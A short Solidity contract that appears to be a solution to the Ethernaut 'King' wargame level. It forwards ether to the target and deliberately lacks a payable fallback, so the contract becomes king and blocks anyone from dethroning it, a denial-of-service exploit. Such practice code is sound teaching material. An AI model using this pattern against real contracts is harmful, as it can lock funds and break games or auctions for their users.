// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

/*
    https://ethernaut.openzeppelin.com/level/0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5
    https://cmichel.io/ethernaut-solutions/
 */
contract BecomeKing {

    address payable challenge = 0xE9C0A428D857E5f3502609f2901b0b573C6816E4;
    function doYourThing(address _target) public payable {
        (bool result,) = _target.call{value:msg.value}("");
        if(!result) revert();
    }

    // OMG NO PAYABLE FALLBACK!!
}